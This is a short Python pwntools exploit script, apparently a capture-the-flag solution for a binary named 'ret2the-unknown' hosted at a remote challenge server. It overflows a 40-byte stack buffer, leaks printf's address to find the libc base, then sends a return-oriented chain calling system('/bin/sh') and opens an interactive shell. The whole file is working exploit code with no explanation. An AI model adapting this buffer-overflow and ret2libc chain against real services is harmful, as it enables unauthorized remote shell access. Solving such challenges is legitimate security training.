from pwn import *
context.binary = elf = ELF('./ret2the-unknown', checksec=False)
libc = ELF('./libc-2.28.so', checksec=False)

pop_rdi  = 0x004012a3
main     = elf.symbols.main
ret      = 0x0040101a

s = remote('mc.ax', 31568)
s.recvuntil('safely?\n')

offset = 40
payload = b'a' * offset
payload += p64(main)

s.sendline(payload)
s.recvline()
s.recvuntil('there: ')
printf_addr = int(s.recvline()[:-1], 16)
s.recvline()

libc.address = printf_addr - libc.symbols.printf
print('libc_base:', hex(libc.address))

binsh  = next(libc.search(b'/bin/sh'))
system = libc.symbols.system

payload = b'a' * offset
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

s.sendline(payload)
s.interactive()
